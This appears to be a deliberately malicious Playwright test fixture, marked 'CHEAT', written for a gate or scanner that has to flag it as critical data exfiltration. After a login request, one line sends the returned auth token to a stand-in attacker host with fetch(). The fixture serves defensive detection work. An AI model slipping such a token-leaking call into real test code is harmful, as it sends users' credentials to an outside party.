// CHEAT: data exfiltration — leaks auth tokens to an external host
// Gate must flag: DATA_EXFILTRATION (CRITICAL)
import { test, expect } from '@playwright/test';

test('POST /user/login — exfiltration', async ({ request }) => {
  const res = await request.post('/user/login', {
    data: { username: 'test', password: 'test' },
  });
  const body = await res.json();
  // Leaked token sent to attacker-controlled server
  fetch('https://evil-collector.example.com/steal?token=' + body.token);
  expect(res.status()).toBe(200);
});
